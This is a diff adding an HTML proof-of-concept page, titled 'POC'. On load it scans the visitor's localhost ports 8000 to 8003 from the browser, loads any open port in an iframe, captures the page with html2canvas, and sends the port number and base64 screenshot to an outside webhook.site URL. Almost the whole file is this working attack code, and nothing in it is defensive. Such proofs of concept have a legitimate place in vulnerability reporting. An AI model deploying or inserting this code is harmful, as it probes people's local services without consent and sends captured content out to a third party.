@@ -1,5 +1,185 @@
+
+<!DOCTYPE html>
 <html>
+<head>
+    <title>POC</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+</head>
 <body>
-<iframe src='http://127.0.0.1:8000'></iframe>
+    <div id="capture-area" style="width: 100%; height: 100vh; position: relative;">
+        <iframe id="scanner-frame" style="width: 100%; height: 100%; border: none;"></iframe>
+    </div>
+
+    <div id="status" style="position: fixed; top: 10px; left: 10px; background: rgba(0,0,0,0.8); color: white; padding: 10px; border-radius: 5px; z-index: 9999;">
+        Starting port scan...
+    </div>
+
+    <script>
+        const ports = [8000, 8001, 8002, 8003];
+        let currentPortIndex = 0;
+        const webhookBase = 'https://webhook.site/4814185f-bd33-4ede-9269-08895f532331';
+        const iframe = document.getElementById('scanner-frame');
+        const statusDiv = document.getElementById('status');
+
+        function checkPort(port) {
+            return new Promise((resolve) => {
+                statusDiv.innerText = `Checking localhost:${port}...`;
+
+                const url = `http://localhost:${port}`;
+
+                // Create an image element to test connectivity
+                const img = new Image();
+                let portOpen = false;
+                let checkComplete = false;
+
+                // Set a timeout
+                const timeout = setTimeout(() => {
+                    if (!checkComplete) {
+                        checkComplete = true;
+                        img.src = '';
+                        statusDiv.innerText = `Port ${port} timeout or closed`;
+                        resolve(false);
+                    }
+                }, 5000);
+
+                // If image loads (even with error), port is open
+                img.onload = img.onerror = function() {
+                    if (!checkComplete) {
+                        checkComplete = true;
+                        clearTimeout(timeout);
+
+                        // Port is open, now load in iframe
+                        iframe.src = url;
+                        statusDiv.innerText = `Port ${port} is open! Loading in iframe...`;
+
+                        // Give iframe time to load
+                        setTimeout(() => {
+                            // Send GET request to webhook with port as query param
+                            fetch(`${webhookBase}?port=${port}`, {
+                                method: 'GET'
+                            }).then(() => {
+                                console.log(`Webhook sent for port ${port}`);
+                            }).catch(err => {
+                                console.log(`Webhook error for port ${port}:`, err);
+                            });
+
+                            // Capture screenshot
+                            html2canvas(document.getElementById('capture-area')).then(canvas => {
+                                const base64 = canvas.toDataURL('image/png');
+
+                                // Also send screenshot with POST
+                                fetch(webhookBase, {
+                                    method: 'POST',
+                                    headers: {
+                                        'Content-Type': 'application/json',
+                                    },
+                                    body: JSON.stringify({
+                                        port: port,
+                                        screenshot: base64,
+                                        timestamp: new Date().toISOString(),
+                                        url: url,
+                                        status: 'open'
+                                    })
+                                }).catch(err => console.log('Screenshot send error:', err));
+                            });
+
+                            resolve(true);
+                        }, 2000); // Give 2 seconds for iframe to render
+                    }
+                };
+
+                // Try to load a favicon or any image from the target
+                img.src = `${url}/favicon.ico?t=${Date.now()}`;
+            });
+        }
+
+        async function scanPorts() {
+            for (const port of ports) {
+                await checkPort(port);
+
+                // Wait a bit between port checks
+                await new Promise(resolve => setTimeout(resolve, 500));
+            }
+
+            statusDiv.innerText = 'Port scan complete!';
+            console.log('All ports scanned');
+        }
+
+        // Alternative method using fetch to detect open ports
+        async function checkPortWithFetch(port) {
+            return new Promise((resolve) => {
+                statusDiv.innerText = `Checking localhost:${port}...`;
+
+                const url = `http://localhost:${port}`;
+                const controller = new AbortController();
+
+                // 5 second timeout
+                const timeout = setTimeout(() => {
+                    controller.abort();
+                }, 5000);
+
+                fetch(url, {
+                    method: 'HEAD',
+                    mode: 'no-cors',
+                    signal: controller.signal
+                })
+                .then(() => {
+                    clearTimeout(timeout);
+                    // If fetch succeeds (even with opaque response), port is likely open
+                    statusDiv.innerText = `Port ${port} is open! Loading in iframe...`;
+                    iframe.src = url;
+
+                    setTimeout(() => {
+                        // Send webhook
+                        fetch(`${webhookBase}?port=${port}`, {
+                            method: 'GET'
+                        }).catch(err => console.log(`Webhook error:`, err));
+
+                        // Capture screenshot
+                        html2canvas(document.getElementById('capture-area')).then(canvas => {
+                            const base64 = canvas.toDataURL('image/png');
+
+                            fetch(webhookBase, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json',
+                                },
+                                body: JSON.stringify({
+                                    port: port,
+                                    screenshot: base64,
+                                    timestamp: new Date().toISOString(),
+                                    url: url,
+                                    status: 'open'
+                                })
+                            }).catch(err => console.log('Screenshot send error:', err));
+                        });
+
+                        resolve(true);
+                    }, 2000);
+                })
+                .catch((err) => {
+                    clearTimeout(timeout);
+                    if (err.name === 'AbortError') {
+                        statusDiv.innerText = `Port ${port} timeout (5s)`;
+                    } else {
+                        statusDiv.innerText = `Port ${port} closed or refused`;
+                    }
+                    resolve(false);
+                });
+            });
+        }
+
+        // Start scanning when page loads
+        window.onload = () => {
+            // Use the fetch-based method for more reliable detection
+            (async () => {
+                for (const port of ports) {
+                    await checkPortWithFetch(port);
+                    await new Promise(resolve => setTimeout(resolve, 500));
+                }
+                statusDiv.innerText = 'Port scan complete!';
+            })();
+        };
+    </script>
 </body>
 </html>
